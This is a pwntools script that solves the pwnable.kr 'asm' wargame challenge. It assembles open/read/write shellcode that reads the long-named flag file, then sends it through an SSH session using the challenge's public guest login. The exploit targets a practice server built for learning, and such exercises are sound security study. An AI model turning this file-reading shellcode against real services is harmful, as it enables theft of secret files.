###Only open,read,write allowed
###Same as pwnable.tw orw
###Use shellcraft this time

from pwn import *
context.arch = 'amd64'

name = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'
shellcode  = ''
shellcode += shellcraft.pushstr(name)
shellcode += shellcraft.open('rsp', 0, 0)
shellcode += shellcraft.read('rax', 'rsp', 100)
shellcode += shellcraft.write(1, 'rsp', 100)
a = asm(shellcode)

s = ssh(host='pwnable.kr', port=2222,
        user='asm',
        password='guest')
r = s.remote('127.0.0.1',9026)
r.sendafter('shellcode: ',a)
r.interactive()
